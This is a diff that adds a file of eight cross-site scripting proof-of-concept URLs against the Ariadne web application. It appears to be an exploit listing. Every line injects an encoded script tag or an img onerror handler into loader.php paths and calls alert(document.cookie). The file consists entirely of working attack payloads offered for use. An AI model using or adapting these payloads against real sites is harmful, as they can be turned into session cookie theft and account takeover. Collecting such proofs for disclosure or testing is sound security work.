@@ -1,0 +1,9 @@
+http://www.example.com/ariadne/www/loader.php/system/ariadne.html?&#039;&quot;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/ariadne/www/?&#039;&quot;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/ariadne/www/loader.php/?&#039;&quot;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/ariadne/www/loader.php/system/?&#039;&quot;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/ariadne/www/loader.php/view.html?&#039;&quot;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/ariadne/www/loader.php/system/view.html?&#039;&quot;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/ariadne/www/loader.php/system/&quot;&gt;&lt;iMg src=N onerror=alert(document.cookie)&gt;
+http://www.example.com/ariadne/www/loader.php/&quot;&gt;&lt;iMg src=N onerror=alert(document.cookie)&gt;
+
